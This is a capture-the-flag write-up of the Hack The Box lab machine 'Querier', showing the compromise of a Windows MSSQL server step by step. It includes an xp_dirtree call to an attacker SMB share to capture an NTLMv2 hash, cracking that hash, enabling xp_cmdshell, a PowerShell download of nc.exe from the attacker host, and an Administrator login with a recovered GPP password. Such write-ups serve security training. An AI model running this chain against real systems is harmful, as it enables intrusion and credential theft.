---
title:     "Hack The Box - Querier"
layout: post
tags: [windows,medium,mssql,responder]
categories: HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-querier/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-querier/Untitled.png)

Link: [https://www.hackthebox.eu/home/machines/profile/175](https://www.hackthebox.eu/home/machines/profile/175)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-06-17T12:51:22
|_Not valid after:  2050-06-17T12:51:22
|_ssl-date: 2020-06-17T12:53:42+00:00; +4m24s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 (90%), Microsoft Windows Server 2016 build 10586 - 14393 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m24s, deviation: 0s, median: 4m23s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-17T12:53:35
|_  start_date: N/A
```

## SMB Enumeration

Started with SMB and there is a `Report` share available for us. I logged in with any password and downloaded the file to my machine.

```bash
root@kali:~/CTF/HTB/Boxes/Querier# smbclient -L 10.10.10.125
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
SMB1 disabled -- no workgroup available
root@kali:~/CTF/HTB/Boxes/Querier# smbclient //10.10.10.125/Reports
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 29 04:53:48 2019
  ..                                  D        0  Tue Jan 29 04:53:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 03:51:34 2019

		6469119 blocks of size 4096. 1589489 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec)
smb: \> exit
```

When I tried to open it using LibreOffice it says its an macro file. So I unzip the it and now we got some more files.

```bash
root@kali:~/CTF/HTB/Boxes/Querier# file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+
root@kali:~/CTF/HTB/Boxes/Querier# unzip Currency\ Volume\ Report.xlsm 
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

I checked all the files and there is a `vbaProject.bin`, I did strings on the file and I found a database and password.

```bash
root@kali:~/CTF/HTB/Boxes/Querier/xl# strings vbaProject.bin 
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

From this I assume that `reporting` is the username and `PcwTWTHRwryjc$c6` is the password.

## MSSQL Enumeration

We can use `[mssqlclient.py](http://mssqlclient.py)` to login to the database.

```bash
root@kali:~/CTF/HTB/Boxes/Querier# mssqlclient.py -windows-auth querier/reporting@querier.htb
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL>
```

Once login I started checking PayloadsAllTheThings to get anything interesting and found this.

> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MSSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

> MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash.

Injected the payload

```bash
SQL> use master; exec xp_dirtree '\\10.10.14.9\w0lf';-- 
[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: master
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------
```

Within a few seconds, I got the hit in my responder with `mssql-svc` hash.

```bash
root@kali:~/CTF/HTB/Boxes/Querier# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.9]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:610c70630570d4c8:A60C90A588237EE78A08233855969026:0101000000000000C0653150DE09D201B1CFBDAABDAB689F000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000C8C40BA5B5827B3A03209D0935643F315D54335AE033B6F1AEA668BCED2D83C70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003900000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
```

Cracked the hash using John

```bash
root@kali:~/CTF/HTB/Boxes/Querier# john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
```

## Getting Shell

This time I login with the credentials we got `mssql-svc : corporate568`

```bash
root@kali:~/CTF/HTB/Boxes/Querier# mssqlclient.py -windows-auth querier/mssql-svc:corporate568@10.10.10.125
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

In PayloadsAllTheThings, there are some ways to do command execution by following that now I can run system commands.

```bash
SQL> EXEC sp_configure 'show advanced options',1;
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell',1;
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

```bash
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL
```

Command execution is working now, why don't we get a reverse shell from here.

Uploaded nc.exe to the machine.

```bash
SQL> xp_cmdshell "powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.9:8000/nc.exe -OutFile C:\Users\mssql-svc\nc.exe "
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

SQL>
```

I got the shell

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-querier/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-querier/Untitled%201.png)

## Privilege Escalation

I uploaded winPEAS to the machine and it give me Administrator Password directly

```bash
[+] Cached GPP Passwords()

C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    Found C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
```

I logged in as Administrator

```bash
root@kali:~# evil-winrm -i 10.10.10.125 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

We Own the System